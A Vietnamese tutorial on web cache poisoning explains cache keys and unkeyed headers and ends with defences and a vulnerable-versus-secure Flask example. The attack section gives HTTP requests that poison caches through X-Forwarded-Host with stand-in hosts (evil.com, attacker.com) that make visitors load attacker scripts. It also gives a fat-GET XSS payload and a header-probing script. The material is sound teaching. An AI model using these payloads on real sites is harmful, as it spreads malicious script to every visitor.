# Web Cache Poisoning

> **CWE**: CWE-349 | **Phân loại**: Data Integrity

## Kiến thức Nền tảng
Hãy tưởng tượng một người phát thư siêu tốc của một công ty lớn (Web Cache). Để phát thư nhanh, người này lập ra một cuốn sổ tay phân loại thư dựa trên các thông tin ghi trên phong bì: "Phương thức gửi + Địa chỉ người nhận + Tiêu đề thư" (những thông tin này được gọi là **cache key**). Nếu có hai bức thư giống hệt nhau về các thông tin này gửi đến, người phát thư sẽ lấy luôn bản sao thư cũ ra giao cho nhanh, thay vì phải chạy vào kho lục lọi lại từ đầu.
Tuy nhiên, bên trong bức thư hoặc trên mép phong bì có thể ghi thêm một số lời nhắn phụ như: "Xin hãy gửi kèm tập tài liệu quảng cáo từ trang web X" (những thông tin ngoài lề này không dùng để phân loại thư, gọi là **unkeyed inputs**).

Mặc dù người phát thư không quan tâm đến lời nhắn phụ này khi phân loại (nó không ảnh hưởng đến cache key), nhưng bộ phận soạn thư ở kho (Origin Server) lại đọc nó và thiết kế nội dung thư trả về dựa trên lời nhắn đó.
Đây chính là sơ hở chết người: Người phát thư vẫn nghĩ đây là một bức thư bình thường và lưu bản sao của nó lại để gửi cho những người tiếp theo, mà không biết rằng nội dung bên trong đã bị biến đổi dựa trên các lời nhắn phụ kia.

```
# Normal cache operation flow
Client A ─→ GET /home ─→ [Cache: MISS] ─→ [Origin Server] ─→ Response (cached)
Client B ─→ GET /home ─→ [Cache: HIT]  ─→ Cached Response (served directly)

# Cache key typically includes:
# Key = METHOD + HOST + PATH + QUERY_STRING
# Unkeyed = Headers (X-Forwarded-Host, Cookie, User-Agent, etc.)
```

```python
# Simplified cache logic (pseudocode)
def handle_request(request):
    # Build cache key from specific request components
    cache_key = f"{request.method}|{request.host}|{request.path}|{request.query}"
    
    cached = cache.get(cache_key)
    if cached:
        return cached  # Cache HIT — return stored response
    
    # Cache MISS — forward to origin
    response = origin_server.forward(request)  # Unkeyed headers still affect this!
    
    if response.is_cacheable():
        cache.store(cache_key, response)  # Store response for future requests
    
    return response
```

## Mô tả lỗ hổng
Lỗ hổng **Web Cache Poisoning (Đầu độc bộ nhớ đệm Web)** giống như một kẻ xấu lén bỏ thuốc độc vào bể chứa nước công cộng của cả khu phố.
Cụ thể, kẻ tấn công gửi một yêu cầu chứa các lời nhắn phụ (unkeyed input như header `X-Forwarded-Host`) chứa mã độc. Máy chủ gốc xử lý yêu cầu này, tạo ra một trang web bị nhiễm mã độc và gửi lại. Bộ nhớ đệm (Cache) thấy yêu cầu này khớp với phân loại thông thường liền lưu trang nhiễm độc này vào kho chứa của mình.

Kể từ giây phút đó, bể nước đã bị nhiễm độc. Bất kỳ người dùng lương thiện nào khác đến yêu cầu trang web đó đều nhận lại bản sao nhiễm độc được phân phối trực tiếp từ bộ nhớ đệm.
Khác với các hình thức tấn công thông thường chỉ nhắm vào một nạn nhân đơn lẻ, đầu độc bộ nhớ đệm có sức tàn phá trên diện rộng: Mọi người truy cập trang web đó đều sẽ bị dính mã độc cho đến khi bộ nhớ đệm tự động xóa bản sao cũ đi hoặc có người phát hiện để làm sạch.

## Cơ chế tấn công
**Bước 1: Tìm unkeyed header ảnh hưởng đến response:**

```http
# Probe with X-Forwarded-Host header — check if it reflects in response
GET /home HTTP/1.1
Host: vulnerable.com
X-Forwarded-Host: attacker.com

# If the response contains:
# <script src="https://attacker.com/resources/main.js"></script>
# Then X-Forwarded-Host is reflected but NOT part of cache key!
```

**Bước 2: Gửi request độc hại để poison cache:**

```http
# Poison the cache — inject malicious host into cached response
GET /home HTTP/1.1
Host: vulnerable.com
X-Forwarded-Host: evil.com/exploit

# Response (gets cached with key "GET|vulnerable.com|/home"):
# HTTP/1.1 200 OK
# <link rel="canonical" href="https://evil.com/exploit/home"/>
# <script src="https://evil.com/exploit/static/app.js"></script>
```

**Bước 3: Mọi user truy cập /home đều bị ảnh hưởng:**

```http
# Innocent user visits the same URL — receives the poisoned cached response
GET /home HTTP/1.1
Host: vulnerable.com

# Response (from cache — contains attacker's payload):
# <script src="https://evil.com/exploit/static/app.js"></script>
# ^^^ Attacker's JavaScript executes in every visitor's browser!
```

**Kỹ thuật nâng cao — Fat GET với unkeyed body:**

```http
# Some frameworks process body in GET requests — body is unkeyed
GET /api/translations?lang=en HTTP/1.1
Host: vulnerable.com
Content-Length: 58

{"locales":"en","default_locale":"en<script>alert(1)</script>"}

# If the body influences the response but isn't in the cache key,
# the XSS payload gets cached and served to all users
```

**Công cụ tự động phát hiện — Param Miner:**

```python
# Automated unkeyed header discovery script
import requests

UNKEYED_HEADERS = [
    'X-Forwarded-Host', 'X-Forwarded-Scheme', 'X-Original-URL',
    'X-Rewrite-URL', 'X-Forwarded-Proto', 'X-Host',
    'X-Forwarded-Server', 'Forwarded', 'CF-Connecting-IP'
]

def probe_unkeyed_headers(target_url):
    """Test each header to find those reflected in the response"""
    baseline = requests.get(target_url).text

    for header in UNKEYED_HEADERS:
        canary = f"cachepoisontest123.com"  # Unique canary value
        response = requests.get(target_url, headers={header: canary})

        if canary in response.text and canary not in baseline:
            print(f"[REFLECTED] {header} → unkeyed and reflected in response!")
        else:
            print(f"[SAFE] {header} — not reflected")

probe_unkeyed_headers("https://target.com/")
```

## Biện pháp phòng thủ
```http
# Include relevant headers in cache key via Vary header
HTTP/1.1 200 OK
Vary: X-Forwarded-Host, Accept-Language, Accept-Encoding
Cache-Control: public, max-age=3600
```
```nginx
# Nginx — strip dangerous headers before forwarding to origin
proxy_set_header X-Forwarded-Host "";
proxy_set_header X-Original-URL "";
proxy_set_header X-Rewrite-URL "";
```

- **Tóm tắt**: Ngăn chặn Web Cache Poisoning bằng cách đưa tất cả các input ảnh hưởng đến phản hồi vào cache key, sử dụng tiêu đề Vary và cấu hình CDN an toàn.
- **Các bước chi tiết**:
  - **Đưa tất cả input ảnh hưởng response vào cache key** — dùng `Vary` header:
  - **Loại bỏ unkeyed header không cần thiết** tại tầng proxy trước khi forward:
  - **Không phản ánh header vào response** — tránh dùng header value trong HTML output.
  - **Sử dụng `Cache-Control: private`** cho trang chứa user-specific content.
  - **Giám sát cache hit rate** — tỷ lệ cache hit bất thường có thể là dấu hiệu poisoning.

## Code Example
```python
# === VULNERABLE: Reflects X-Forwarded-Host into page without cache key ===
from flask import Flask, request

app = Flask(__name__)

@app.route('/home')
def home():
    # X-Forwarded-Host is used to build asset URLs but NOT in cache key
    cdn_host = request.headers.get('X-Forwarded-Host', 'cdn.example.com')
    return f'''
    <html>
    <head><script src="https://{cdn_host}/assets/app.js"></script></head>
    <body>Welcome!</body>
    </html>
    '''  # DANGEROUS: attacker controls cdn_host via unkeyed header

# === SECURE: Whitelist allowed hosts, ignore unknown forwarded headers ===
ALLOWED_CDN_HOSTS = {'cdn.example.com', 'static.example.com'}

@app.route('/home-secure')
def home_secure():
    cdn_host = request.headers.get('X-Forwarded-Host', 'cdn.example.com')
    if cdn_host not in ALLOWED_CDN_HOSTS:
        cdn_host = 'cdn.example.com'  # Fallback to safe default
    return f'''
    <html>
    <head><script src="https://{cdn_host}/assets/app.js"></script></head>
    <body>Welcome!</body>
    </html>
    '''  # SAFE: only whitelisted CDN hosts are used
```

## Xem thêm
- [CRLF Injection](../../05-injection/crlf-injection/) — Tấn công chèn các ký tự xuống dòng để phân tách HTTP response, thường được dùng để thêm các header độc hại phục vụ cho Web Cache Poisoning.

## Nguồn tham khảo
- PortSwigger: https://portswigger.net/web-security/web-cache-poisoning
- OWASP: https://owasp.org/www-community/attacks/Cache_Poisoning
- CWE: https://cwe.mitre.org/data/definitions/349.html
- James Kettle: https://portswigger.net/research/practical-web-cache-poisoning

## Giải thích thuật ngữ
- **Web Cache**: Bộ nhớ đệm trung gian lưu giữ bản sao các phản hồi từ máy chủ để phân phối nhanh cho người dùng, giúp giảm tải hệ thống.
- **Cache Key**: Chuỗi khóa định danh được tạo ra từ một số thành phần của yêu cầu (như địa chỉ trang web, phương thức gửi) dùng để đối chiếu xem tài nguyên đã có sẵn trong bộ nhớ đệm hay chưa.
- **Unkeyed Inputs**: Các phần dữ liệu của yêu cầu (như các header bổ sung) không tham gia vào việc tạo ra cache key nhưng vẫn được máy chủ gốc xử lý.
- **Origin Server**: Máy chủ gốc xử lý mã nguồn và cơ sở dữ liệu chính của website.
- **Cache MISS**: Trạng thái yêu cầu gửi tới bộ nhớ đệm nhưng chưa có sẵn bản sao, buộc phải chuyển tiếp yêu cầu đến máy chủ gốc.
- **Cache HIT**: Trạng thái bộ nhớ đệm đã có sẵn bản sao yêu cầu và trả về ngay lập tức cho người dùng.
- **Fat GET**: Yêu cầu HTTP sử dụng phương thức GET nhưng có gửi kèm theo phần thân dữ liệu (body), một hành vi không phổ biến có thể gây bối rối cho hệ thống cache.
- **Vary Header**: Header HTTP dùng để hướng dẫn bộ nhớ đệm biết những header nào của client cần được đưa vào để tính toán cache key.
- **Payload**: Đoạn mã độc hoặc dữ liệu được kẻ tấn công sử dụng để khai thác lỗ hổng.
